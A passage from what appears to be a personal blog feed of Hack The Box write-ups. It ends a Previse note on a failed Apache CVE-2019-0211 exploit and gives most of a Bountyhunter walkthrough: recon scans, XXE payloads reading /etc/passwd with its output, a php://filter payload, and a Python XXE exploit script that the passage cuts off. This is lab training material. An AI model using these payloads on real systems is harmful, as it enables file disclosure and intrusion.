  apache: 0x7f17474c9000-0x0x7f17475fc000

Obtaining apache workers PIDs
  Found apache worker: 2974
  Found apache worker: 3994
  Found apache worker: 4002
  Found apache worker: 4080
  Found apache worker: 4091
  Found apache worker: 4100
  Found apache worker: 4620
  Found apache worker: 4621
  Found apache worker: 4622
  Found apache worker: 4623
  Found apache worker: 4625
  Found apache worker: 4903
  Found apache worker: 4904
  Found apache worker: 4910
  Found apache worker: 4997
  Found apache worker: 4998
  Found apache worker: 5002
Got 17 PIDs.

Triggering UAF
  Creating room and filling empty spaces
  Allocating $abc and $p
  Unsetting both variables and setting $protector
  Creating DateInterval object
UAF failed, exiting.
</code></pre>
<p>Reading the exploit author blog <a href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html,">https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html,</a> it says this exploit needs to obtain R/W privileges on a worker process, and it uses a PHP UAF 0-day exploit.</p>
<blockquote>
<p>Since mod_prefork is often used in combination with mod_php, it seems natural to exploit the vulnerability through PHP. <a href="https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch">CVE-2019-6977 (exploit)</a> would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):</p>
</blockquote>
<p>Let&rsquo;s verify if the PHP version is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6977">CVE-2019-6977 (NIST)</a>. According to the CVE description, vulnerable version are PHP before 5.6.40, 7.x before 7.1.26, 7.2.x before 7.2.14, and 7.3.x before 7.3.1.</p>
<pre><code>m4lwhere@previse:~$ php --version
PHP 7.2.24-0ubuntu0.18.04.8 (cli) (built: Jul  5 2021 17:41:32) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.24-0ubuntu0.18.04.8, Copyright (c) 1999-2018, by Zend Technologies
</code></pre>
<p>The installed PHP version is patched against this UAF Trigger vulnerability :( and this is why we were not able to use this exploit.</p>
<p>Let&rsquo;s verify other conditions for the exploit to work. It needs some vulnerable modules enables.</p>
<blockquote>
<p>The vulnerability affects mod_prefork, mod_worker and mod_event. The following bug description, code walkthrough and exploit target mod_prefork.</p>
</blockquote>
<p>Only one out of the three modules are enabled, but it is not clear whether all three or any of the modules needs to be enabled for this exploit to work.My understanding is only mod_prefork is needed, and it is loaded by Apache.</p>
<pre><code>m4lwhere@previse:~$ apache2ctl -M | egrep &quot;event|prefork|worker&quot;
mpm_prefork_module (shared)

m4lwhere@previse:/etc/apache2/mods-enabled$ ls | egrep &quot;prefork|worker|event&quot;
mpm_prefork.conf
mpm_prefork.load

m4lwhere@previse:/etc/apache2/mods-available$ ls | egrep &quot;prefork|worker|event&quot;
mpm_event.conf
mpm_event.load
mpm_prefork.conf
mpm_prefork.load
mpm_worker.conf
mpm_worker.load
</code></pre>
<p>CONCLUSION: This Apache exploits needs another PHP 0-day which have been already patched. It is still possible to have it work if we find another vulnerability or weakness to obtain R/W access on a worker process.</p>
]]></content></item><item><title>HTB - Bountyhunter</title><link>https://0xade1.github.io/posts/2021/10/htb-bountyhunter/</link><pubDate>Sun, 17 Oct 2021 08:57:48 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-bountyhunter/</guid><description>Exploration rustscan -a 10.10.11.100 -- -A -sCV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |\_http-server-header: Apache/2.4.41 (Ubuntu) |\_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find few interesting php pages:
$ gobuster dir -u http://10.10.11.100 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.</description><content type="html"><![CDATA[<h2 id="exploration">Exploration</h2>
<pre><code>rustscan -a 10.10.11.100 -- -A -sCV

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>We find few interesting php pages:</p>
<pre><code>$ gobuster dir -u http://10.10.11.100 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php -s 200,204
[..]
/db.php (Status: 200)
/index.php (Status: 200)
/portal.php (Status: 200)
</code></pre>
<h1 id="xxe---xml-entity">XXE - XML ENTITY</h1>
<p>We find a submission portal for bounty hunter programme http://10.10.11.100/log_submit.php</p>
<p>It submits a form sent as a base64, then urlencoded xml that translate into:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
    <span style="color:#ff79c6">&lt;bugreport&gt;</span>
    <span style="color:#ff79c6">&lt;title&gt;</span>myexploit<span style="color:#ff79c6">&lt;/title&gt;</span>
    <span style="color:#ff79c6">&lt;cwe&gt;</span>mycwe<span style="color:#ff79c6">&lt;/cwe&gt;</span>
    <span style="color:#ff79c6">&lt;cvss&gt;</span>mycvss<span style="color:#ff79c6">&lt;/cvss&gt;</span>
    <span style="color:#ff79c6">&lt;reward&gt;</span>1000<span style="color:#ff79c6">&lt;/reward&gt;</span>
    <span style="color:#ff79c6">&lt;/bugreport&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>After different tries in Burp, we find it is vulnerable to XXE - XML ENTITY injection.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34; ?&gt;</span>
<span style="color:#ff79c6">&lt;!DOCTYPE data [
</span><span style="color:#ff79c6">&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
]&gt;
		<span style="color:#ff79c6">&lt;bugreport&gt;</span>
		<span style="color:#ff79c6">&lt;title&gt;</span>&amp;file;<span style="color:#ff79c6">&lt;/title&gt;</span>
		<span style="color:#ff79c6">&lt;cwe&gt;</span>mycwe<span style="color:#ff79c6">&lt;/cwe&gt;</span>
		<span style="color:#ff79c6">&lt;cvss&gt;</span>mycvss<span style="color:#ff79c6">&lt;/cvss&gt;</span>
		<span style="color:#ff79c6">&lt;reward&gt;</span>1000<span style="color:#ff79c6">&lt;/reward&gt;</span>
		<span style="color:#ff79c6">&lt;/bugreport&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>In the response, there is one user development:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span> <span style="color:#bd93f9">200</span> OK
Date<span style="color:#ff79c6">:</span> Sun, 17 Oct 2021 01:20:36 GMT
Server<span style="color:#ff79c6">:</span> Apache/2.4.41 (Ubuntu)
Vary<span style="color:#ff79c6">:</span> Accept-Encoding
Content-Length<span style="color:#ff79c6">:</span> 2105
Connection<span style="color:#ff79c6">:</span> close
Content-Type<span style="color:#ff79c6">:</span> text/html; charset=UTF-8

If DB were ready, would have added:
&lt;<span style="color:#ff79c6">table</span>&gt;
  &lt;<span style="color:#ff79c6">tr</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;Title:&lt;/<span style="color:#ff79c6">td</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin❌2:2:bin:/bin:/usr/sbin/nologin
sys❌3:3:sys:/dev:/usr/sbin/nologin
sync❌4:65534:sync:/bin:/bin/sync
games❌5:60:games:/usr/games:/usr/sbin/nologin
man❌6:12:man:/var/cache/man:/usr/sbin/nologin
lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail❌8:8:mail:/var/mail:/usr/sbin/nologin
news❌9:9:news:/var/spool/news:/usr/sbin/nologin
uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy❌13:13:proxy:/bin:/usr/sbin/nologin
www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
backup❌34:34:backup:/var/backups:/usr/sbin/nologin
list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync❌102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus❌103:106::/nonexistent:/usr/sbin/nologin
syslog❌104:110::/home/syslog:/usr/sbin/nologin
_apt❌105:65534::/nonexistent:/usr/sbin/nologin
tss❌106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd❌107:112::/run/uuidd:/usr/sbin/nologin
tcpdump❌108:113::/nonexistent:/usr/sbin/nologin
landscape❌109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate❌110:1::/var/cache/pollinate:/bin/false
sshd❌111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin
development❌1000:1000:Development:/home/development:/bin/bash
lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false
usbmux❌112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
&lt;/<span style="color:#ff79c6">td</span>&gt;
  &lt;/<span style="color:#ff79c6">tr</span>&gt;
  &lt;<span style="color:#ff79c6">tr</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;CWE:&lt;/<span style="color:#ff79c6">td</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;mycwe&lt;/<span style="color:#ff79c6">td</span>&gt;
  &lt;/<span style="color:#ff79c6">tr</span>&gt;
  &lt;<span style="color:#ff79c6">tr</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;Score:&lt;/<span style="color:#ff79c6">td</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;mycvss&lt;/<span style="color:#ff79c6">td</span>&gt;
  &lt;/<span style="color:#ff79c6">tr</span>&gt;
  &lt;<span style="color:#ff79c6">tr</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;Reward:&lt;/<span style="color:#ff79c6">td</span>&gt;
    &lt;<span style="color:#ff79c6">td</span>&gt;1000&lt;/<span style="color:#ff79c6">td</span>&gt;
  &lt;/<span style="color:#ff79c6">tr</span>&gt;
&lt;/<span style="color:#ff79c6">table</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>To exfiltrate php code, we have to use instead:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource={file}&#34;&gt;</span> ]&gt;
</code></pre></td></tr></table>
</div>
</div><p>Other XXE techniques below did not work:</p>
<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt;
</code></pre>
<h1 id="exploit-development">exploit development</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#6272a4">#pip3 install bs4 lxml</span>
<span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">from</span> base64 <span style="color:#ff79c6">import</span> b64encode
<span style="color:#ff79c6">from</span> urllib.parse <span style="color:#ff79c6">import</span> quote_plus
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">from</span> bs4 <span style="color:#ff79c6">import</span> BeautifulSoup

file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(sys<span style="color:#ff79c6">.</span>argv) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span>:
    file<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39; &#39;</span><span style="color:#ff79c6">.</span>join(sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>:])
<span style="color:#ff79c6">else</span>:
    file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/etc/passwd&#34;</span>
url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://10.10.11.100/tracker_diRbPr00f314.php&#34;</span>

doctype <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
<span style="color:#ff79c6">if</span> file[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span>:] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;php&#39;</span>:
    doctype <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=</span><span style="color:#f1fa8c">{</span>file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;&gt; ]&gt;&#39;</span>
<span style="color:#ff79c6">else</span>:
    doctype <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&lt;!DOCTYPE data [ &lt;!ENTITY xxe SYSTEM &#34;</span><span style="color:#f1fa8c">{</span>file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;&gt; ]&gt;&#39;</span>

<span style="color:#6272a4"># Beware no \n at the beginning of the xml file</span>
xxe <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;&#34;&#34;&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34; ?&gt;
</span><span style="color:#f1fa8c"></span><span style="color:#f1fa8c">{</span>doctype<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">    &lt;bugreport&gt;
</span><span style="color:#f1fa8c">    &lt;title&gt;&amp;xxe;&lt;/title&gt;
</span><span style="color:#f1fa8c">    &lt;cwe&gt;mycwe&lt;/cwe&gt;
</span><span style="color:#f1fa8c">    &lt;cvss&gt;mycvss&lt;/cvss&gt;
</span><span style="color:#f1fa8c">    &lt;reward&gt;1000&lt;/reward&gt;
</span><span style="color:#f1fa8c">    &lt;/bugreport&gt;
</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>

xxe <span style="color:#ff79c6">=</span> b64encode(xxe<span style="color:#ff79c6">.</span>encode())
xxe <span style="color:#ff79c6">=</span> quote_plus(xxe)

headers <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;Content-Type&#39;</span>: <span style="color:#f1fa8c">&#39;application/x-www-form-urlencoded; charet=UTF-8&#39;</span>}
params <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;data=</span><span style="color:#f1fa8c">{</span>xxe<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>
